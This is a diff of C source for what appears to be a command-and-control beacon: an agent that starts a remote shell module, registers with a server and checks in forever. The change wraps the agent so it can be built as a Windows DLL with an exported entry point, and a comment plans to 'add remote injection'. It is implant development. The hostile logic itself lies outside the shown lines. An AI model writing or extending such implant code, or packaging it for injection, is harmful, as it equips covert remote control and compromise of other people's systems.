@@ -120,12 +120,13 @@ static int do_checkin(void) {
     return 0;
 }
 
+
 /**
  * @brief Agent entry point. Initialises the shell module, registers with the
  *        server using exponential backoff, then runs the checkin loop forever.
  * @return 1 on fatal init failure (never returns on success).
  */
-int main(void) {
+int beacon_main(void) {
     char agent_id[AGENT_ID_SIZE] = {0};
     srand((unsigned int)GetTickCount());
 
@@ -177,3 +178,22 @@ int main(void) {
     shell_cleanup();
     return 0;
 }
+
+// TODO: add remote injection 
+#ifdef BUILD_DLL
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) { return TRUE; }
+__declspec(dllexport) void Start(void) {
+    beacon_main();
+}
+
+#else
+
+int main(void) {
+    beacon_main();
+    return 0;
+}
+
+#endif
+
+
+
